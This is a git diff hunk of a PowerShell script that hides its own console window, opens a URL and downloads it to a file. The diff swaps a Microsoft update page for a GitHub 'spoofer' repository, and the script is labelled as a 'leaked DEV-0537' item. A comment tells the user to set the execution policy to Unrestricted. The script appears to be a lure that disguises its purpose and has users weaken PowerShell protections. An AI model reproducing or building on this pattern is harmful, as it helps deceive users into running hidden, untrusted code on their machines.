@@ -7,9 +7,9 @@ public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-#Leaked DEV-0537 Microsoft update :)
+#Leaked DEV-0537 spoofer :)
 # Make sure to paste Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser inside of powershell or thing's get a lil funni
-$url = "https://support.microsoft.com/en-us/windows/get-the-latest-windows-update-7d20e88c-0568-483a-37bc-c3885390d212" 
+$url = "https://github.com/SecHex/SecHex-Spoofy" 
 
 Start-Process $url
 Invoke-WebRequest -Uri $url -OutFile $outputFile
